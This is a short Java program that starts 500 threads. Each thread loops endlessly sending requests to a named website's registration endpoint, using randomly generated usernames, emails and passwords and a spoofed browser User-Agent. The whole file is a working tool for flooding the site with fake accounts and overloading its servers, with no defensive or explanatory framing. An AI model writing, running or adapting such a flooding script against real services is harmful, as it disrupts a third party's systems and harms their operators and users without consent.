import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

public class Main
{
    private static final String URL = "https://crmnl.club/p/register?keyauthusername=%s&keyauthmail=%s&keyauthpassword=%s&register_submit=";

    private static final Random RANDOM = new Random();

    private static final char[] CHARS = "ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".toCharArray();

    public static void main(final String[] args) {
        for (int i = 0; i < 500; i++) init();
    }

    private static void init() {
        new Thread(() -> {
            while (true) {
                try {
                    final URL url = new URL(String.format(URL, generate(16), generate(6) + "@" + generate(6) + ".xyz", generate(16)));

                    final URLConnection connection = url.openConnection();
                    connection.addRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36");

                    System.out.println(url);

                    final StringBuilder builder = new StringBuilder();
                    try (final InputStream stream = connection.getInputStream()) {
                        int index;
                        while ((index = stream.read()) != -1) builder.append((char) index);
                    } finally {
                        System.out.println(builder);
                    }
                } catch (final Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private static String generate(final int count) {
        final StringBuilder builder = new StringBuilder();
        for (int i = 0; i < count; i++) builder.append(CHARS[RANDOM.nextInt(CHARS.length)]);
        return builder.toString();
    }
}
